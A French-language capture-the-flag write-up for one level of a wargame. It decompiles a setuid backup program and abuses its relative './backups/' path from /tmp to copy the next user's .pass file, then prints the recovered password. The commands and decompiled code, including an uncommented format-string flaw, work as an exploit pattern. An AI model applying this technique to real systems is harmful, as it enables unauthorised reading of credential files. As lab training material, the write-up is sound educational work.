Je commence par analyser mon environnement :

```bash
$ id && pwd && ls -la
uid=1008(level08) gid=1008(level08) groups=1008(level08),100(users)
/home/users/level08
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
```

Je trouve un binaire `level08`, que je tente d'éxecuter ainsi qu'un dossier `backups`:

```bash
$ cd backups/
$ ls -la
total 0
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log
$ cat .log
$
$ cd ..
$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
$ ./level08 /backups/.log
ERROR: Failed to open /backups/.log
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=fb42ad07-6308-45df-b8f7-fe3953c56ac1#BinaryNinja=305) en recoupant avec les compilateurs qui marchent et l'ASM :

```c
void log_wrapper(FILE *file, char *msg, char *filename)
{
    char buf[264];

    strcpy(buf, msg);
    snprintf(&buf[strlen(buf)], 254 - strlen(buf), filename);

    buf[strcspn(buf, "\n")] = 0;

    fprintf(file, "LOG: %s\n", buf);
}

int main(int ac, char **av)
{
    FILE *log;
    FILE *file;
    int fd;
    char c;
    char path[104];

    c = -1;
    fd = -1;

    if (ac != 2) 
    {
        printf("Usage: %s filename\n", *av);
    }

    log = fopen("./backups/.log", "w");
    if (!log)
    {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(log, "Starting back up: ", av[1]);

    file = fopen(av[1], "r");
    if (!file)
    {
        printf("ERROR: Failed to open %s\n", av[1]);
        exit(1);
    }

    strcpy(path, "./backups/");
    strncat(path, av[1], 99 - strlen(path));
    fd = open(path, 193, 432LL);
    if (fd < 0)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", av[1]);
        exit(1);
    }

    while ((c = fgetc(file)) != -1)
        write(fd, &c, 1uLL);

    log_wrapper(log, "Finished back up ", argv[1]);
    fclose(file);
    close(fd);
    return 0;
}
```

Comme dans le précédent niveau, je n'observe pas spécialement de fonction vulnérable, cependant, en analysant ce que fais le programme je note qu'il :

- Prend en argument le nom d'un fichier
- Le lit
- L'écrit dans un fichier dans le dossier `./backups` (celui où je me trouve donc, puisque path relatif)
- Si le fichier n'existe pas dans le dossier `./backups`, le backup échoue
- Si le fichier existe, le backup réussis et le fichier dans `./backups` et donc actualisé par le binaire

Naturellement, j'essaye donc de créer un fichier `.pass` dans `backups` :

```bash
$ cd backups
$ mkdir home
mkdir: cannot create directory `home': Permission denied
```

Or, je n'ai pas les droits. Cependant, je note que le dossier backups utilisé est relatif à l'endroit où le binaire est exécuté, et j'ai les droits d'écrire dans `/tmp` dans la VM, facile :

```bash
$ cd /tmp
$ mkdir -p ./backups/home/users/level09/
$ ~/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```


